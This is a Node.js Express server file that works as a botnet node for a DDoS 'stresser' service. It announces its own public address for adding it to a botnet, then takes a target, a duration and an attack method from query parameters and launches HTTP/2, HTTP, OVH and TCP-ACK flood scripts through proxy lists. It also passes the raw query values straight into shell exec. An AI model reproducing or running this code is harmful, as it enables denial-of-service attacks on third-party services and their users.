const express = require('express');
const { exec } = require('child_process');
const url = require('url');

const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 5032;
async function fetchData() {
const response = await fetch('https://httpbin.org/get');
const data = await response.json();
console.log(`Copy This Add To Botnet -> http://${data.origin}:${port}`);
return data
}

app.get('/BruteStresser', (req, res) => {
  const { target, ports, time, methods } = req.query;
  const sikat = new url.URL(target);
  const slurp = sikat.hostname
res.status(200).json({
    message: 'API request received. Executing script shortly.',
    target,
    ports,
    time,
    methods
  });

if (methods === 'H2-BRUTE') {
	console.log(`recieved`)
    exec(`node ./lib/cache/h2-brute.js ${target} ${time} 4 3 proxy.txt`);
} else if (methods === 'H2-KAR') {
	console.log(`recieved`)
    exec(`node ./lib/cache/h2-kar.js ${target} ${time} 9 7 proxy.txt`);
} else if (methods === 'H2-BYPASS') {
	console.log(`recieved`)
    exec(`node ./lib/cache/h2-bypass.js ${target} ${time} 9 7 proxy.txt`);
} else if (methods === 'H2-UZ') {
	console.log(`recieved`)
    exec(`node ./lib/cache/h2-uz.js ${target} ${time} 2 9 proxy.txt`);
} else if (methods === 'HTTP-SICARIO') {
	console.log(`recieved`)
    exec(`node ./lib/cache/http-sicario.js ${target} ${time} 9 3 proxy.txt`);
} else if (methods === 'HTTP-FLOOD') {
	console.log(`recieved`)
    exec(`node ./lib/cache/http-flood.js ${target} ${time} 9 3 proxy.txt`);
} else if (methods === 'HTTP-UAM') {
	console.log(`recieved`)
    exec(`node ./lib/cache/http-uam.js ${target} ${time} 16 20 proxy.txt`);
} else if (methods === 'HTTP-BLOODS') {
	console.log(`recieved`)
    exec(`node ./lib/cache/http-bloods.js ${target} ${time} 16 3 proxy.txt`);
} else if (methods === 'R2') {
	console.log(`recieved`)
    exec(`node ./lib/cache/r2.js ${target} ${time} 9 20 proxy.txt`);
} else if (methods === 'HTTP-SUN') {
	console.log(`recieved`)
    exec(`node ./lib/cache/http-sun.js ${target} 8 proxy.txt 10 ${time}`);
} else if (methods === 'HTTP-MONTH') {
	console.log(`recieved`)
    exec(`node ./lib/cache/http-month.js ${target} ${time} 32 7 proxy.txt`);
} else if (methods === 'OVH') {
	console.log(`recieved`)
    exec(`node ./lib/cache/ovh ${target} ${port} 1000 ${time}`);
} else if (methods === 'TCP-ACK') {
	console.log(`recieved`)
    exec(`node ./lib/cache/tcp-ack.js ${target} ${port} ${time}`);
} else {}
});
app.listen(port, () => {
fetchData()
});
